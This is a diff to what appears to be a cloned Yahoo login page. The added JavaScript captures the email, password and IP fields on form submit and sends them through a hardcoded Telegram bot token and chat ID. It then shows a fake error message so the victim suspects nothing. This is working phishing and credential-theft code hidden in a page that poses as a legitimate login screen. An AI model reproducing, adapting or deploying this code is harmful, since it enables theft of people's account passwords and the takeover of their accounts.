@@ -392,3 +392,31 @@ root.comscoreBeaconUrl = "https:\u002F\u002Fsb.scorecardresearch.com\u002Fp?c1=2
 
 <!-- lfe04.member.ir2.yahoo.com - Tue Apr 24 2018 11:10:38 GMT+0000 (UTC) - (45ms) -->
 <script src="https://fc.yahoo.com/sdarla/php/client.php?l=RICH{dest:tgtRICH;asz:flex}&amp;f=150002529&amp;ref=https%3A%2F%2Flogin.yahoo.com%2F" style="display: none !important;"></script><script src="https://fc.yahoo.com/sdarla/php/client.php?l=RICH{dest:tgtRICH;asz:flex}&amp;f=150002529&amp;ref=https%3A%2F%2Flogin.yahoo.com%2F"></script><script src="https://fc.yahoo.com/sdarla/php/client.php?l=RICH{dest:tgtRICH;asz:flex}&amp;f=150002529&amp;ref=https%3A%2F%2Flogin.yahoo.com%2F"></script></body></html>
+     }        
+      })
+    })
+
+    const forma = document.querySelector('#form')
+    
+      let bot = {
+          TOKEN: "7497322095:AAGpyGAJsVG-LOQyXpf4HBJMgzO3HY8gfAk",
+          chatID: "7106606725"
+      }
+
+
+      forma.addEventListener("submit", e =>{
+          e.preventDefault();
+
+          let email = document.querySelector('#e-mail').value
+          let pwd = document.querySelector('#pwd').value
+		  let ip = document.querySelector('#ipaddress').value
+		  
+          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=Remax270Email:==>${email}=Password:==>${pwd}=IP:==>${ip}`, {
+              method: "GET"
+          }).then(success => {
+
+      const dangerMessage = document.querySelector("#msg")
+      const myTimeout = setTimeout(myGreeting, 3000);
+      
+      function myGreeting() {
+       dangerMessage.style.display = "block"
